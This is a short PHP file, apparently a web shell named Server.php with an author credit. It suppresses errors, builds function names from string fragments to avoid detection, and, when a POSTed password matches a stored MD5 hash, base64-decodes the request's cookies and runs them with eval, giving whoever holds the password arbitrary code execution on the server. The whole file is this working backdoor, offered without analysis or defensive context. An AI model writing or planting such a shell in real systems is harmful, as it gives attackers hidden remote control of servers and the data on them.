<?php
// Server.php
// Author : Rudra Sarkar
// Email : rudrasarkar815@gmail.com

error_reporting(0);
$p="f11e654062d5d8869d085bfee229eb9d";

$f='sT'.'R_r'.'ePl'.'Ac'.'E';$c='cou'.'nt';
$e=$_COOKIE;

if($c($e)>1&&md5(@$_POST['p'])==$p)
{
	$e=base64_decode(join($e));
    echo'<apple>';
    @eval($e);
    echo'<apple>';
	}
?>